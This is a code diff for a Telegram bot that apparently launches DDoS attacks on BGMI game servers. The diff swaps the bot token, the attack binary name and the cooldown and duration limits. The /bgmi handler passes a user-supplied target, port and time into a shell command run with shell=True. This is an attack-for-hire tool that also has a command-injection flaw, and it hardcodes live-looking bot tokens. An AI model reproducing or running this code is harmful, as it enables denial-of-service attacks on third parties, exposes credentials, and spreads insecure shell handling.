@@ -8,7 +8,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7702515994:AAHTS2tdWl7kUBc8Sffo7ZArHxl1Bin4Bso')
+bot = telebot.TeleBot('8173709926:AAF3XGYUT90yIj58dC3iQtRekH6miCsMWuo')
 
 # Admin user IDs
 admin_id = ["6864281179"]
@@ -285,7 +285,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =120
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -307,13 +307,13 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 600:
-                response = "Error: Time interval must be less than 600."
+            if time > 240:
+                response = "Error: Time interval must be less than 240."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./Rahul {target} {port} {time} 900"
+                full_command = f"./smokey {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
